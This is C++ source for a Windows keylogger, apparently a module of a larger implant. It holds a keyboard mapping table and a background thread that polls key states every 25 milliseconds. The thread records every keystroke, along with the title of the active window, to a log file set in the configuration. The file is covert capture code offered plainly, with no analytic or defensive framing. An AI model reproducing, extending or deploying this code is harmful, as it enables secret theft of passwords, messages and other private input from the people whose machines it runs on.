#ifndef KEYLOG_HOOK
#include "keylogger.h"

PCHAR KeyMap[223][2] = {{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"<", "<"},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"\r\n", "\r\n"},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{" ", " "},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"0", ")"},
						{"1", "!"},
						{"2", "@"},
						{"3", "#"},
						{"4", "$"},
						{"5", "%"},
						{"6", "^"},
						{"7", "&"},
						{"8", "*"},
						{"9", "("},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"a", "A"},
						{"b", "B"},
						{"c", "C"},
						{"d", "D"},
						{"e", "E"},
						{"f", "F"},
						{"g", "G"},
						{"h", "H"},
						{"i", "I"},
						{"j", "J"},
						{"k", "K"},
						{"l", "L"},
						{"m", "M"},
						{"n", "N"},
						{"o", "O"},
						{"p", "P"},
						{"q", "Q"},
						{"r", "R"},
						{"s", "S"},
						{"t", "T"},
						{"u", "U"},
						{"v", "V"},
						{"w", "W"},
						{"x", "X"},
						{"y", "Y"},
						{"z", "Z"},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"0", "0"},
						{"1", "1"},
						{"2", "2"},
						{"3", "3"},
						{"4", "4"},
						{"5", "5"},
						{"6", "6"},
						{"7", "7"},
						{"8", "8"},
						{"9", "9"},
						{"*", "*"},
						{"+", "+"},
						{"|", "|"},
						{"-", "-"},
						{".", "."},
						{"/", "/"},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{";", ":"},
						{"=", "+"},
						{",", "<"},
						{"-", "_"},
						{".", ">"},
						{"/", "?"},
						{"`", "~"},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"", ""},
						{"[", "{"},
						{"\\", "|"},
						{"]", "}"},
						{"'", "\""}};

KeyLogThread::KeyLogThread(){
	StartThread();
}

VOID KeyLogThread::ThreadFunc(VOID){
	SHORT KeyState[256];
	LONG OldChecksum = -1;
	LONG Checksum = 0;
	HWND OldWindow = GetForegroundWindow();
	BOOL FileExists = GetFileAttributes(Config::GetKeylogFilename()) == -1 ? FALSE : TRUE;
	while(1){
		for(UINT i = 0; i < 256; i++){
			KeyState[i] = GetAsyncKeyState(i);
			Checksum += KeyState[i];
		}
		if(OldChecksum != Checksum){
			for(UINT i = 0; i < 223; i++){
				if(KeyState[i] == 0xFFFF8001){
					File File(Config::GetKeylogFilename());
					File.GoToEOF();
					UCHAR Character = i;
					BOOL Uppercase = 0;
					if(KeyState[VK_SHIFT] & 0x8000)
						Uppercase ^= 1;
					if(KeyState[VK_CAPITAL] & 0x8000)
						Uppercase ^= 1;
					if(Character < 223 && Character > 7){
						if(GetForegroundWindow() != OldWindow){
							CHAR Title[256];
							GetWindowText(GetForegroundWindow(), Title, sizeof(Title));
							if(FileExists)
								File.Writef("\r\n\r\n");
							File.Writef("    [%s]\r\n", Title);
							OldWindow = GetForegroundWindow();
							FileExists = TRUE;
						}
						File.Writef("%s", KeyMap[Character][Uppercase]);
					}
				}
			}
		}
		OldChecksum = Checksum;
		Sleep(25);
	}
}

#endif